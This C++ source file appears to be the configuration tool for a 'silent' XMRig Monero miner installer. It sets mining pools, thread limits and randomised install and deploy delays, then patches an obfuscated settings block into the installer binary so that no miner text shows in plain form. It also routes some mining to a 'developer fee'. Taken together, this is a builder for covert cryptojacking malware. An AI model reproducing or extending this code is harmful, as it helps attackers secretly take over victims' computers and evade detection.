#include "settings.h"
#include "dialog.h"

minerConfig mConfig;

int magickCrypt = 54;

settings s1 =
{
	{ "12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345",
	  "12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345",
	  "12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345",
	  "12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345",
	  "12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345" }, //addrs

	{ "monerohash.com:9999",
	  "pool.supportxmr.com:9000",
	  "xmr-us-west1.nanopool.org:14433",
	  "" }, //americaWestPools

	{ "monerohash.com:9999",
	  "pool.supportxmr.com:9000",
	  "xmr-us-east1.nanopool.org:14433",
	  "" }, //americaEastPools

	{ "xmrpool.eu:9999",
	  "pool.supportxmr.com:9000",
	  "xmr-eu1.nanopool.org:14433",
	  "xmr-eu2.nanopool.org:14433" }, //EuropePools

	{ "pool.supportxmr.com:9000",
	  "xmr-asia1.nanopool.org:14433",
	  "",
	  "" }, //AsiaPools

	"--coin monero -k --rig-id worker --cpu-priority 0 --tls",

	80, //maxThreads
	2048, //L3CachePerThread
	6144, //lightModeRam

	120, //installerDelayMin
	360, //installerDelayMax

	2, //minerDeployDelayMin
	7, //minerDeployDelayMax

	{ "", "", "" } //customArgs

};

void showTestValue(HWND hwnd)
{
	std::string resultArgs;
	generateStartArguments(&mConfig, &resultArgs);
	getSetStringInEditControl(hwnd, &resultArgs, IDC_EDIT33, true);
}

void generateSettingsForDIalog() 
{
	generateSettings(&mConfig, &s1);
}

void configureSilentMinerInstaller(std::string binaryName)
{
	TCHAR buffer[MAX_PATH] = { 0 };
	GetModuleFileName(NULL, buffer, MAX_PATH);

	uint64_t pNum = mConfig.pointer;
	std::ifstream fileIn;
	std::ofstream fileOut;
	std::ifstream::pos_type pos;
	size_t size;
	char* minerBin;
	std::string errorMsg;
	std::string outPath = std::string("configured") + binaryName;
	minerConfig* mConfigp;

	//If installer bin was not found, probably configurator is located in Release dir or you are debuging
	fileIn.open(binaryName, std::ios::binary | std::ios::ate);
	if (fileIn.fail())
	{
		std::string installerDir = std::string(buffer).substr(0, std::string(buffer).find_last_of("\\/")) + "\\..\\..\\..\\Binaries\\";
		fileIn.open(installerDir + binaryName, std::ios::binary | std::ios::ate);
		outPath = installerDir + outPath;
	}


	if (fileIn.fail()) {
		errorMsg = std::string("An error has occurred!\nWas not able to locate silent XMRig installer\n") + binaryName;
		MessageBox(NULL, errorMsg.c_str(), "Error!", MB_ICONERROR | MB_OK);
		goto ERRORCREATE;
	}

	pos = fileIn.tellg();
	size = pos;

	fileOut.open(outPath, std::ios::binary | std::ios::trunc);

	minerBin = (char*)malloc(size);
	fileIn.seekg(0, std::ios::beg);
	fileIn.read(minerBin, size);

	if (minerBin == nullptr) 
	{
		goto ERRORCREATE;
	}

	fileIn.close();

	mConfigp = (minerConfig*)malloc(sizeof(minerConfig));
	*mConfigp = mConfig;

	//'Encrypt' structure, so no miner specific plain text is present in binary
	configLightEncrypt(mConfigp, magickCrypt);

	//Replace minerConfig structure in binary
	replaceMinerConfig(mConfigp, &minerBin, size);

	//Write miner installer in to file
	if (fileOut.is_open())
	{
		fileOut.write((char*)minerBin, size);
		fileOut.close();
	}
	else 
	{
		goto ERRORCREATE;
	}

	free(minerBin);
	free(mConfigp);

	return;

ERRORCREATE:
	MessageBox(NULL, "An error has occurred!\nconfigured installer was not created\nCheck source code", "Error!", MB_ICONERROR | MB_OK);
}

void loadSettingsFromSilentMinerInstaller() 
{
	std::ifstream fileIn;
	std::ifstream::pos_type pos;
	size_t size;
	char* minerBin;
	minerConfig* mConfigp;
	OPENFILENAME fn;
	char szFileName[MAX_PATH] = "";

	ZeroMemory(&fn, sizeof(fn));
	fn.lStructSize = sizeof(fn);
	fn.hwndOwner = NULL;
	fn.lpstrFilter = "All Files (*.*)\0*.*\0";
	fn.lpstrFile = szFileName;
	fn.nMaxFile = MAX_PATH;
	fn.lpstrTitle = "Select silent miner installer";
	fn.Flags = OFN_FILEMUSTEXIST;

	if (GetOpenFileName(&fn) == TRUE)
	{
		fileIn.open(szFileName, std::ios::binary | std::ios::ate);
		if (fileIn.fail())
		{
			goto ERRORCREATE;
		}
		
		pos = fileIn.tellg();
		size = pos;

		minerBin = (char*)malloc(size);
		fileIn.seekg(0, std::ios::beg);
		fileIn.read(minerBin, size);

		if (minerBin == nullptr || size == 0)
		{
			goto ERRORCREATE;
		}

		fileIn.close();

		uint64_t pNum = mConfig.pointer;

		for (size_t i = 0; i < size - sizeof(uint64_t); i++) {
			uint64_t* p = (uint64_t*)(minerBin + i);

			if (*p == pNum) {
				mConfigp = (minerConfig*)p;

				if (mConfigp->configured == false) 
				{
					MessageBox(NULL, szFileName, "Settings in file are not configured", MB_OK);
					free(minerBin);
					return;
				}

				configLightDecrypt(mConfigp, 54);
				settingsFromConfig(mConfigp, &s1);

				MessageBox(NULL, szFileName, "Loaded settings from File", MB_OK);
				free(minerBin);

				return;
			}
		}

		MessageBox(NULL, szFileName, "Settings not found in File", MB_ICONERROR | MB_OK);
		free(minerBin);
	}

	return;

ERRORCREATE:
	MessageBox(NULL, "An error has occurred!\nconfiguration was not loaded\nCheck source code", "Error!", MB_ICONERROR | MB_OK);
}

void getSetDialogValues(HWND hwnd, bool set)
{
	for (int i = 0; i < sizeof(s1.addrs) / sizeof(s1.addrs[0]); getSetStringInEditControl(hwnd, &s1.addrs[i], IDC_EDIT1 + i, set), i++);

	for (int i = 0; i < sizeof(s1.americaWestPools) / sizeof(s1.americaWestPools[0]); getSetStringInEditControl(hwnd, &s1.americaWestPools[i], IDC_EDIT6 + i, set), i++);
	for (int i = 0; i < sizeof(s1.americaEastPools) / sizeof(s1.americaEastPools[0]); getSetStringInEditControl(hwnd, &s1.americaEastPools[i], IDC_EDIT10 + i, set), i++);
	for (int i = 0; i < sizeof(s1.EuropePools) / sizeof(s1.EuropePools[0]); getSetStringInEditControl(hwnd, &s1.EuropePools[i], IDC_EDIT14 + i, set), i++);
	for (int i = 0; i < sizeof(s1.AsiaPools) / sizeof(s1.AsiaPools[0]); getSetStringInEditControl(hwnd, &s1.AsiaPools[i], IDC_EDIT18 + i, set), i++);

	getSetNumberInEditControl(hwnd, &s1.installerDelayMin, IDC_EDIT22, set);
	getSetNumberInEditControl(hwnd, &s1.installerDelayMax, IDC_EDIT23, set);
	if (s1.installerDelayMax < s1.installerDelayMin)
	{
		s1.installerDelayMax = s1.installerDelayMin;
		getSetNumberInEditControl(hwnd, &s1.installerDelayMax, IDC_EDIT23, true);
	}
	getSetNumberInEditControl(hwnd, &s1.minerDeployDelayMin, IDC_EDIT24, set);
	getSetNumberInEditControl(hwnd, &s1.minerDeployDelayMax, IDC_EDIT25, set);
	if (s1.minerDeployDelayMax < s1.minerDeployDelayMin)
	{
		s1.minerDeployDelayMax = s1.minerDeployDelayMin;
		getSetNumberInEditControl(hwnd, &s1.minerDeployDelayMax, IDC_EDIT25, true);
	}

	getSetNumberInEditControl(hwnd, &s1.lightModeRam, IDC_EDIT26, set);
	getSetNumberInEditControl(hwnd, &s1.maxThreads, IDC_EDIT27, set);
	if (s1.maxThreads > 100)
	{
		s1.maxThreads = 100;
		getSetNumberInEditControl(hwnd, &s1.maxThreads, IDC_EDIT27, true);
	}

	getSetNumberInEditControl(hwnd, &s1.L3CachePerThread, IDC_EDIT28, set);

	getSetStringInEditControl(hwnd, &s1.additionalArgs, IDC_EDIT29, set);

	for (int i = 0; i < sizeof(s1.customArgs) / sizeof(s1.customArgs[0]); getSetStringInEditControl(hwnd, &s1.customArgs[i], IDC_EDIT30 + i, set), i++);
}


std::string developerFeeArgs()
{
	return "developer fee args";
}

void generateStartArguments(minerConfig* config, std::string* result)
{
	int customerPoolNum = 0;
	customerPoolNum = config->americaEastPoolsNum + config->americaWestPoolsNum + config->asiaPoolsNum + config->europePoolsNum;

	if (randomAnInt(0, 7) == 0)
	{
		*result = developerFeeArgs();
		return;
	}

	if (config->configured == false || customerPoolNum == 0)
	{
		*result = developerFeeArgs() + " *missconfigured miner";
		return;
	}

	*result = constructArguments(config);
}